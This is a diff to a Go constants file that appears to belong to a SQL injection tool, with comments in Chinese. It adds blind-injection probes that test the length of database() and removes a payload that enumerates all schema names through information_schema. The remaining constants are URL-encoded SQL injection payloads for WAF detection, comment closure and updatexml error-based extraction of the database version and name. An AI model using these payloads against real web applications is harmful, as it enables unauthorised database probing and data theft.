@@ -3,6 +3,10 @@ package constant
 const (
 	// DetectWafPayload 检测WAF的Payload
 	DetectWafPayload = "'%20or%201=1--+"
+	// BlindDetectTruePayload 盲注正确检测
+	BlindDetectTruePayload = "%20and%20length(database())>1%20--+"
+	// BlindDetectFalsePayload 盲注错误检测
+	BlindDetectFalsePayload = "%20and%20length(database())>10000%20--+"
 	// SuffixCondition 检测闭合符号的Payload
 	SuffixCondition = "%20--+"
 	// SuffixPayload 检测闭合符号的Payload
@@ -44,9 +48,6 @@ const (
 	UpdatexmlVersionPayload = "%20and%20updatexml(2,concat(0x7e,version(),0x7e),1)--+"
 	// UpdatexmlDatabasePayload 报错注入获得当前数据库
 	UpdatexmlDatabasePayload = "%20and%20updatexml(2,concat(0x7e,database(),0x7e),1)--+"
-	// UpdatexmlAllDatabasesPayload 报错获得所有数据库
-	UpdatexmlAllDatabasesPayload = "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
-		"from%20information_schema.schemata%20limit%200,1),0x7e),1)--+"
 )
 
 // 报错注入另一种（不稳定）
